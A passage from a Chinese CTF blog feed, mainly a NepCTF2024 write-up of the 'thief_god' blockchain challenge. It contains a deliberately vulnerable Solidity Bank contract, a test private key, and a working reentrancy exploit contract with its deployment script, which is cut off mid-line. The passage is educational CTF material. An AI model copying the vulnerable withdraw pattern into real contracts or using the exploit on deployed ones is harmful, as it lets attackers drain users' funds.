aria-hidden="true">image-20240829162759993</figcaption></figure><p>后面的步骤跟ISCC2024的<ahref="https://blog.csdn.net/administratorlws/article/details/139154964?ops_request_misc=%257B%2522request%255Fid%2522%253A%252239915FCB-333C-46C6-879E-240F264B325F%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=39915FCB-333C-46C6-879E-240F264B325F&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139154964-null-null.142%5Ev100%5Epc_search_result_base4&amp;utm_term=iscc%20%E6%9C%89%E4%BA%BA%E8%AE%A9%E6%88%91%E7%BB%99%E4%BD%A0%E5%B8%A6%E4%B8%AA%E8%AF%9D&amp;spm=1018.2226.3001.4187">有人让我给你带个话</a>这题是一样的，由于<ahref="https://blog.csdn.net/qq_36959443/article/details/116136965">lyra工具的安装</a>有点困难，我目前没安装成功，就先不复现下去了(T0T)，以后再用到的时候再研究吧</p><p>flag: DASCTF{W0w!_You_d0_4_g00d_j0b!}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2024 Writeup</title>
      <link href="/posts/cebc5081/"/>
      <url>/posts/cebc5081/</url>
      
        <content type="html"><![CDATA[<blockquote><p>由于是同一个比赛，writeup和复现就放在同一篇文章里了</p></blockquote><h2 id="writeup部分">Writeup部分</h2><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/NepCTF2024Writeup.pdf">Writeup点我</a></h4><h2 id="复现部分">复现部分</h2><h3 id="blockchain">Blockchain</h3><h4 id="thief_god">thief_god</h4><blockquote><p>本题中使用的是智能合约安全中的重入攻击，看网上说这已经是很基础的东西了，结果我比赛时弄了大半天都没弄明白。。。该找个时间好好学学区块链了。。。</p></blockquote><h5 id="题目">题目</h5><p>1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_source, install_solc</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 安装特定版本的solc</span></span><br><span class="line">install_solc(<span class="string">&#x27;0.8.26&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Hardhat节点并将输出重定向到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hardhat_node_output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    node_process = subprocess.Popen(</span><br><span class="line">        [<span class="string">&quot;npx&quot;</span>, <span class="string">&quot;hardhat&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;--hostname&quot;</span>, <span class="string">&quot;0.0.0.0&quot;</span>],</span><br><span class="line">        stdout=outfile,</span><br><span class="line">        stderr=subprocess.PIPE,</span><br><span class="line">        text=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">30</span>)  <span class="comment"># 等待节点启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取节点输出以获取账户信息</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hardhat_node_output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">    output = infile.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析Hardhat节点的输出以获取账户信息</span></span><br><span class="line">accounts = re.findall(<span class="string">r&#x27;0x[a-fA-F0-9]&#123;40&#125;&#x27;</span>, output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(accounts) &lt; <span class="number">2</span>:</span><br><span class="line">    node_process.kill()</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;无法获取足够的账户信息&quot;</span>)</span><br><span class="line"></span><br><span class="line">deployer_account_address = accounts[<span class="number">0</span>]</span><br><span class="line">attacker_account_address = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用默认私钥初始化Web3实例</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://127.0.0.1:8545&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保连接成功</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> w3.is_connected():</span><br><span class="line">    node_process.kill()</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;无法连接到以太坊节点&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置部署者和攻击者账户的私钥</span></span><br><span class="line">deployer_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line">attacker_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">deployer_account = &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: deployer_account_address,</span><br><span class="line">    <span class="string">&quot;private_key&quot;</span>: deployer_private_key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attacker_account = &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: attacker_account_address,</span><br><span class="line">    <span class="string">&quot;private_key&quot;</span>: attacker_private_key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solidity合约代码</span></span><br><span class="line">solidity_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="string">pragma solidity ^0.8.0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">contract Bank &#123;</span></span><br><span class="line"><span class="string">    mapping(address =&gt; uint256) public balanceOf;</span></span><br><span class="line"><span class="string">    string private flag;</span></span><br><span class="line"><span class="string">    uint256 public flagPrice = 50 ether;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 事件日志</span></span><br><span class="line"><span class="string">    event Deposit(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event Withdraw(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event TransferFailed(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event FlagPurchased(address indexed buyer, string flag);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    constructor(string memory _flag) &#123;</span></span><br><span class="line"><span class="string">        flag = _flag;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 存入ether，并更新余额</span></span><br><span class="line"><span class="string">    function deposit() external payable &#123;</span></span><br><span class="line"><span class="string">        balanceOf[msg.sender] += msg.value;</span></span><br><span class="line"><span class="string">        emit Deposit(msg.sender, msg.value);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     // 提取msg.sender的全部ether</span></span><br><span class="line"><span class="string">    function withdraw() external &#123;</span></span><br><span class="line"><span class="string">        uint256 balance = balanceOf[msg.sender]; // 获取余额</span></span><br><span class="line"><span class="string">        require(balance &gt; 0, &quot;Insufficient balance&quot;);</span></span><br><span class="line"><span class="string">        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span></span><br><span class="line"><span class="string">        require(success, &quot;Failed to send Ether&quot;);</span></span><br><span class="line"><span class="string">        // 更新余额</span></span><br><span class="line"><span class="string">        balanceOf[msg.sender] = 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 获取银行合约的余额</span></span><br><span class="line"><span class="string">    function getBalance() external view returns (uint256) &#123;</span></span><br><span class="line"><span class="string">        return address(this).balance;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 获取flag</span></span><br><span class="line"><span class="string">    function getFlag() external view returns (string memory) &#123;</span></span><br><span class="line"><span class="string">        require(balanceOf[msg.sender] &gt;= flagPrice, &quot;Insufficient balance to get flag&quot;);</span></span><br><span class="line"><span class="string">        return flag;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译Solidity合约</span></span><br><span class="line">compiled_sol = compile_source(solidity_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从编译后的内容中获取正确的键值</span></span><br><span class="line">contract_id, contract_interface = compiled_sol.popitem()</span><br><span class="line"><span class="comment"># 创建合约对象</span></span><br><span class="line">Bank = w3.eth.contract(abi=contract_interface[<span class="string">&#x27;abi&#x27;</span>], bytecode=contract_interface[<span class="string">&#x27;bin&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造交易</span></span><br><span class="line">nonce = w3.eth.get_transaction_count(deployer_account[<span class="string">&quot;address&quot;</span>])</span><br><span class="line"></span><br><span class="line">T=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">while</span> T&lt;<span class="number">200</span>:</span><br><span class="line">        flag = os.getenv(<span class="string">&#x27;GZCTF_FLAG&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Environment variable &#x27;GZCTF_FLAG&#x27; is not set. Waiting for 1 minute...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># Wait for 1 minute</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the flag</span></span><br><span class="line">flag = get_flag()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the transaction using the flag from the environment variable</span></span><br><span class="line">transaction = Bank.constructor(flag).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">31337</span>,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 签署交易</span></span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key=deployer_account[<span class="string">&quot;private_key&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送交易</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交易回执</span></span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出合约地址和ABI</span></span><br><span class="line">bank_contract_address = tx_receipt.contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约部署成功，地址为: <span class="subst">&#123;bank_contract_address&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约ABI: <span class="subst">&#123;contract_interface[<span class="string">&quot;abi&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">subprocess.Popen([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;2.py&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_tcp_server</span>(<span class="params">host, port, message</span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.bind((host, port))</span><br><span class="line">        s.listen()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Listening on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            conn, addr = s.accept()</span><br><span class="line">            <span class="keyword">with</span> conn:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Connected by <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">                conn.sendall(message.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">f&quot;Bank合约部署成功，地址与测试账号私钥为: <span class="subst">&#123;bank_contract_address&#125;</span> <span class="subst">&#123;attacker_account[<span class="string">&#x27;private_key&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">start_tcp_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">65432</span>, message)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hardcat.config.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-toolbox&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@type</span> import(&#x27;hardhat/config&#x27;).HardhatUserConfig */</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: <span class="string">&quot;0.8.26&quot;</span>,</span><br><span class="line">  <span class="attr">networks</span>: &#123;</span><br><span class="line">    <span class="attr">hardhat</span>: &#123;</span><br><span class="line">      <span class="attr">accounts</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;20000000000000000000000&quot;</span>  </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;0x4b609fde92771ee750dac4d0aace6c9cf34e341229dbda382e49c492ad206e5e&quot;</span>,<span class="comment">//attacker</span></span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;10000000000000000000&quot;</span>  </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;10000000000000000000000&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">&#125;,</span><br><span class="line">    <span class="attr">localhost</span>: &#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&quot;http://127.0.0.1:8545&quot;</span>,</span><br><span class="line">      <span class="comment">// 本地网络通常不需要配置账户</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">defaultNetwork</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>地址获取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到本地节点</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&quot;https://neptune-xxxxx.nepctf.lemonprefect.cn&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来扫描区块链并查找合约创建交易</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_contract_addresses</span>(<span class="params">start_block, end_block</span>):</span><br><span class="line">    contract_addresses = []</span><br><span class="line">    <span class="keyword">for</span> block_number <span class="keyword">in</span> <span class="built_in">range</span>(start_block, end_block + <span class="number">1</span>):</span><br><span class="line">        block = web3.eth.get_block(block_number, full_transactions=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block.transactions:</span><br><span class="line">            <span class="keyword">if</span> tx.to <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">                receipt = web3.eth.get_transaction_receipt(tx.<span class="built_in">hash</span>)</span><br><span class="line">                contract_addresses.append(receipt.contractAddress)</span><br><span class="line">    <span class="keyword">return</span> contract_addresses</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描区块范围</span></span><br><span class="line">start_block = <span class="number">0</span>  <span class="comment"># 起始区块</span></span><br><span class="line">end_block = web3.eth.block_number  <span class="comment"># 当前最新区块</span></span><br><span class="line">contracts = find_contract_addresses(start_block, end_block)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Deployed contract addresses:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> address <span class="keyword">in</span> contracts:</span><br><span class="line">    <span class="built_in">print</span>(address)</span><br></pre></td></tr></table></figure><h5 id="解题">解题</h5><p>阅读代码，大部分是展示了题目的部署，有用的信息是智能合约的代码和给出的攻击者的privatekey。直接在metamask中用privatekey导入账户即可得到攻击者账户的地址0x2eca396F5474202720C4561c06ABcc0Bdd186E2c。</p><figure><img src="/images/NepCTF2024-Writeup/image-20240827000351346.png"alt="image-20240827000351346" /><figcaption aria-hidden="true">image-20240827000351346</figcaption></figure><p>然后用题目所给的脚本扫一下找到题目部署的合约地址</p><figure><img src="/images/NepCTF2024-Writeup/image-20240827000642428.png"alt="image-20240827000642428" /><figcaption aria-hidden="true">image-20240827000642428</figcaption></figure><p>这样就做完了前期的准备工作。</p><p>接下来就是重入攻击，先放个<ahref="https://mp.weixin.qq.com/s/4j5_CirSySE1GLd3BP9CZQ">传送门</a>在这。</p><p>阅读题目中给出的合约代码，合约实现了向“银行”存、取、查以及getFlag的操作，银行中本来有50ether。根据重入攻击，我们要做的是在从“银行”中取钱时触发一个fallback函数，使得能从“银行”中一直取钱，直到”银行“中的钱小于1ether。据此可以编写如下合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Bank &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function getBalance() external view returns (uint256);</span><br><span class="line">    function getFlag() external view returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Bank public etherStore;</span><br><span class="line">    string public flag;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = Bank(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        etherStore.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag() external &#123;</span><br><span class="line">        etherStore.deposit&#123;value: address(this).balance&#125;();</span><br><span class="line">        flag = etherStore.getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署的代码直接抄题目中的即可，输出我们的合约部署的地址和abi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_source, install_solc</span><br><span class="line">install_solc(<span class="string">&#x27;0.8.26&#x27;</span>)</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;https://neptune-43115.nepctf.lemonprefect.cn&quot;</span>))</span><br><span class="line">solidity_code =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="string">pragma solidity ^0.8.0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">interface Bank &#123;</span></span><br><span class="line"><span class="string">    function deposit() external payable;</span></span><br><span class="line"><span class="string">    function withdraw() external;</span></span><br><span class="line"><span class="string">    function getBalance() external view returns (uint256);</span></span><br><span class="line"><span class="string">    function getFlag() external view returns (string memory);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">contract Hack &#123;</span></span><br><span class="line"><span class="string">    Bank public etherStore;</span></span><br><span class="line"><span class="string">    string public flag;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    constructor(address _etherStoreAddress) &#123;</span></span><br><span class="line"><span class="string">        etherStore = Bank(_etherStoreAddress);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fallback() external payable &#123;</span></span><br><span class="line"><span class="string">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span></span><br><span class="line"><span class="string">            etherStore.withdraw();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function attack() external payable &#123;</span></span><br><span class="line"><span class="string">        etherStore.deposit&#123;value: msg.value&#125;();</span></span><br><span class="line"><span class="string">        etherStore.withdraw();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function getflag() external &#123;</span></span><br><span class="line"><span class="string">        etherStore.deposit&#123;value: address(this).balance&#125;();</span></span><br><span class="line"><span class="string">        flag = etherStore.getFlag();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">compiled_sol = compile_source(solidity_code)</span><br><span class="line">contract_id, contract_interface = compiled_sol.popitem()</span><br><span class="line">Bank = w3.eth.contract(</span><br><span class="line">    abi=contract_interface[<span class="string">&#x27;abi&#x27;</span>], bytecode=contract_interface[<span class="string">&#x27;bin&#x27;</span>])</span><br><span class="line">nonce = w3.eth.get_transaction_count(<span 